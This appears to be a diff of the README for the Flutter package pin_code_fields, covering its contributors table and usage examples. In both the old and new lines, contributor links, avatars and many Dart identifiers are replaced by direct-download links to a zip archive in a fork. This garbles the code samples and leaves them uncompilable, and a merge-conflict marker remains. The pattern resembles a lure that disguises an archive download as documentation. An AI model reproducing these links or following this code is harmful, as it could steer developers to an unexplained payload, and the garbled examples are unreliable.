-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Stanislav Ilin"/><br /><sub><b>Stanislav Ilin</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-   <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Varun Barad"/><br /><sub><b>Varun Barad</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-   <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Mohak Shrivastava"/><br /><sub><b>Mohak Shrivastava</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-   <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="ItamarMu"/><br /><sub><b>ItamarMu</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-   <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Kim Minju"/><br /><sub><b>Kim Minju</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Jeffry Hermanto"/><br /><sub><b>Jeffry Hermanto</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="ItamarMu"/><br /><sub><b>ItamarMu</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Sebastian Roth"/><br /><sub><b>Sebastian Roth</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Dango Mango"/><br /><sub><b>Dango Mango</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Stanislav Ilin"/><br /><sub><b>Stanislav Ilin</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+   <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Varun Barad"/><br /><sub><b>Varun Barad</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+   <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Mohak Shrivastava"/><br /><sub><b>Mohak Shrivastava</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+   <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="ItamarMu"/><br /><sub><b>ItamarMu</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+   <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Kim Minju"/><br /><sub><b>Kim Minju</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
   </tr>
 
   <tr>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Dmitry Vakhnin"/><br /><sub><b>Dmitry Vakhnin</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="serendipity1004"/><br /><sub><b>Jiho Choi</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="jobfeikens"/><br /><sub><b>Job</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="BrunoEleodoro"/><br /><sub><b>Bruno Eleodoro Roza</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="tgbarker"/><br /><sub><b>tgbarker</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="karabanovbs"/><br /><sub><b>karabanovbs</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="adarsh-technocrat"/><br /><sub><b>Adarsh kumar singh</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="adrianFarkas"/><br /><sub><b>Farkas Adrián</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="grafovdenis"/><br /><sub><b>Denis Grafov</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="ItzNotABug"/><br /><sub><b>DarShan</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="dhruvanbhalara"/><br /><sub><b>Dhruvan Bhalara</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Dmitry Vakhnin"/><br /><sub><b>Dmitry Vakhnin</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="serendipity1004"/><br /><sub><b>Jiho Choi</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="jobfeikens"/><br /><sub><b>Job</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="BrunoEleodoro"/><br /><sub><b>Bruno Eleodoro Roza</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="tgbarker"/><br /><sub><b>tgbarker</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="karabanovbs"/><br /><sub><b>karabanovbs</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="adarsh-technocrat"/><br /><sub><b>Adarsh kumar singh</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="adrianFarkas"/><br /><sub><b>Farkas Adrián</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="grafovdenis"/><br /><sub><b>Denis Grafov</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="ItzNotABug"/><br /><sub><b>DarShan</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="dhruvanbhalara"/><br /><sub><b>Dhruvan Bhalara</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
 <<<<<<< HEAD
 =======
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="rodion-m"/><br /><sub><b>Rodion Mostovoy</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
+  <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="rodion-m"/><br /><sub><b>Rodion Mostovoy</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
 >>>>>>> 8272cbfd8a1dab43b2b4f4f1107752dda1d9d230
   </tr>
 </table>
@@ -352,16 +352,16 @@ Thanks to everyone whoever suggested their thoughts to improve this package. And
 PinCodeTextField(
   length: 6,
   obscureText: false,
-  animationType: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+  animationType: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
   pinTheme: PinTheme(
-    shape: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
-    borderRadius: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(5),
+    shape: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
+    borderRadius: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(5),
     fieldHeight: 50,
     fieldWidth: 40,
-    activeFillColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+    activeFillColor: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
   ),
   animationDuration: Duration(milliseconds: 300),
-  backgroundColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+  backgroundColor: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
   enableActiveFill: true,
   errorAnimationController: errorController,
   controller: textEditingController,
@@ -422,7 +422,7 @@ StreamController<ErrorAnimationType> errorController = StreamController<ErrorAni
 PinCodeTextField(
   length: 6,
   obscureText: false,
-  animationType: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+  animationType: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
   animationDuration: Duration(milliseconds: 300),
   errorAnimationController: errorController, // Pass it here
   onChanged: (value) {
@@ -436,7 +436,7 @@ PinCodeTextField(
 3. Then you can trigger the animation just by writing this:
 
 ```Dart
-https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip); // This will shake the pin code field
+https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip); // This will shake the pin code field
 ```
 
 **This full code is from the example folder. You can run the example to see.**
@@ -449,7 +449,7 @@ class MyApp extends StatelessWidget {
     return MaterialApp(
       title: 'Flutter Demo',
       theme: ThemeData(
-        primarySwatch: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+        primarySwatch: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
       ),
       home: PinCodeVerificationScreen(
           "+8801376221100"), // a random number, please don't call xD
@@ -460,7 +460,7 @@ class MyApp extends StatelessWidget {
 class PinCodeVerificationScreen extends StatefulWidget {
   final String phoneNumber;
 
-  PinCodeVerificationScreen(https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip);
+  PinCodeVerificationScreen(https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip);
 
   @override
   _PinCodeVerificationScreenState createState() =>
@@ -471,7 +471,7 @@ class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
   var onTapRecognizer;
 
   TextEditingController textEditingController = TextEditingController();
-  // https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip = "123456";
+  // https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip = "123456";
 
   StreamController<ErrorAnimationType> errorController;
 
@@ -483,67 +483,67 @@ class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
   @override
   void initState() {
     onTapRecognizer = TapGestureRecognizer()
-      https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip = () {
-        https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context);
+      https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip = () {
+        https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(context);
       };
     errorController = StreamController<ErrorAnimationType>();
-    https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();
+    https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip();
   }
 
   @override
   void dispose() {
-    https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();
+    https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip();
 
-    https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();
+    https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip();
   }
 
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      backgroundColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+      backgroundColor: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
       key: scaffoldKey,
       body: GestureDetector(
         onTap: () {},
         child: Container(
